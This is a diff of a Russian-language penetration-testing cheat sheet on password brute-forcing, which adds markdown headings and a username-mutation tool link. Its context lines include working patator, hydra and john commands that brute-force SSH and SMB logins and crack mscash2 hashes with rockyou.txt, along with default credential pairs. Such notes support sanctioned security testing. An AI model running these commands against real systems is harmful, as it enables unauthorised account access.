@@ -1,4 +1,4 @@
-Перебор паролей для сервисов SSH, smb и т.д.
+# Перебор паролей для сервисов SSH, smb и т.д.
 
 patator ssh_login host=10.8.0.14 user=john password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg=’Authentication failed.’
 
@@ -20,9 +20,9 @@ hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V
 
 
 
-метасплойт в метасплойт
+# метасплойт в метасплойт
 
-Перебор хешей по словарю и брут
+# Перебор хешей по словарю и брут
 
 john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt filehash
 
@@ -124,3 +124,6 @@ root:password
 admin:admin1
 admin:password1
 root:password1
+
+# Создание мутаций имен и фамилий
+https://github.com/urbanadventurer/username-anarchy
